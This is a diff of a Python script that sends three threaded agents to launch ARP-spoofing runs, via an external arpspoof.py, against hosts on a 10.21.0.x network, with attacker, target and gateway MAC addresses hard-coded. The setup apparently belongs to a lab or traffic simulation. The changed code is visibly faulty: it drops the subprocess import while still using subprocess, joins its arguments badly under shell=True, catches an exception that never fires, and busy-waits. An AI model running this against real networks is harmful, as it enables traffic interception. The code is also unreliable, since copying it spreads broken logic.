@@ -4,23 +4,22 @@ import random
 import time
 import sys
 from datetime import datetime, timedelta
-import subprocess
 
 INTERFACES = ['Melchior', 'Balthasar', 'Casper']
 TARGET_INTERFACES = ['Maria', 'Rose', 'Sina']
 
 # Data structure for agents
 agents_info = {
-    'Melchior': {'interface_mac': 'F6:91:7F:74:12:F6'},
-    'Balthasar': {'interface_mac': 'F2:C7:F1:B6:80:98'},
-    'Casper': {'interface_mac': 'B2:DE:93:F3:CD:F8'}
+    'Melchior': 'F6:91:7F:74:12:F6',
+    'Balthasar': 'F2:C7:F1:B6:80:98',
+    'Casper': 'B2:DE:93:F3:CD:F8'
 }
 
 # Data structure for targets
 targets_info = {
-    'Maria': {'target_mac': 'CE:32:51:9F:81:02'},
-    'Rose': {'target_mac': '12:45:6C:CD:58:D6'},
-    'Sina': {'target_mac': 'B2:DA:BF:0C:ED:AB'}
+    'Maria': {'target_ip':'10.21.0.11','target_mac':'CE:32:51:9F:81:02'},
+    'Rose':  {'target_ip':'10.21.0.12','target_mac':'12:45:6C:CD:58:D6'},
+    'Sina':  {'target_ip':'10.21.0.13','target_mac':'B2:DA:BF:0C:ED:AB'}
 }
 
 # Number of agents
@@ -33,7 +32,10 @@ interface_lock = [threading.Lock() for _ in range(num_agents)]
 
 def execute_code(agent_id, target_interface): # ARP-poison script: https://github.com/EONRaider/Arp-Spoofer
     agent_name = INTERFACES[agent_id]
-    agent_interface_mac = agents_info[agent_name]['interface_mac']
+    agent_interface_mac = agents_info[agent_name]
+
+    targetip = targets_info[target_interface]['target_ip']
+    targetmac = targets_info[target_interface]['target_mac']
 
     with interface_lock[agent_id]:
         print(f"Agent {agent_name} ({agent_id}) is executing code on {target_interface}.")
@@ -43,36 +45,39 @@ def execute_code(agent_id, target_interface): # ARP-poison script: https://githu
         duration = random.uniform(2, 4)
         end_time = datetime.now() + timedelta(minutes=duration)
 
-        command = [
-            'python3',
-            'arp-spoof.py',
-            '-i', target_interface,
-            '--targetmac', targets_info[target_interface]['target_mac'],
-            '--atackermac', agent_interface_mac,
-            '--gatemac', 'DE:BC:50:A7:AD:9E',
+
+        command = ['python3 arpspoof.py',
+            targetip, 
+            '-i', agent_name,
+            '--attackermac', agent_interface_mac,
+            '--targetmac', targetmac, 
+            '--gatewaymac DE:BC:50:A7:AD:9E'
+            ' -f'
         ]
-        print(f"Agent {agent_name} is running the following command: {' '.join(command)}")
+
 
         try:
-            subprocess.run(command, check=True)
+            print(f"Agent {agent_name} is running the following command: {' '.join(command)}")
+            process = subprocess.Popen(command, shell=True)
         except subprocess.CalledProcessError as e:
             print(f"Agent {agent_name} failed to execute the command: {' '.join(command)}")
             print(f"Error: {e}")
             # Handle the failure here
-
+    
         # Run the loop until the specified end time
-        if datetime.now() > end_time :
-            print(f"Agent {agent_name} finished executing code on {target_interface}.")
-            subprocess.run(['pkill', '-f', 'arp-spoof.py'], check=False) 
-            return
+        while True :
+            if datetime.now() >= end_time:
+                print(f"Agent {agent_name} finished executing code on {target_interface}.")
+                process.kill()
+                return
 
 
 # Function to run an agent
 def run_agent(agent_id):
 
     # Introduce a random delay before starting each agent
-    random_start_delay = random.uniform(120, 240)  # Random delay between 0 to 60 seconds
-    time.sleep(random_start_delay)
+    # random_start_delay = random.uniform(120, 240)  # Random delay between 2 to 4 minutes
+    # time.sleep(random_start_delay)
 
     while True:
         # Choose a random target interface
@@ -102,10 +107,6 @@ def main():
     except KeyboardInterrupt:
         print("\nReceived KeyboardInterrupt. Stopping agents...")
         sys.exit()
-
-    # Stop the ARP spoofing subprocess by sending a signal
-    subprocess.run(['pkill', '-f', 'arp-spoof.py'], check=False) 
-
 
     # Stop the agents by joining the threads
     for thread in threads:
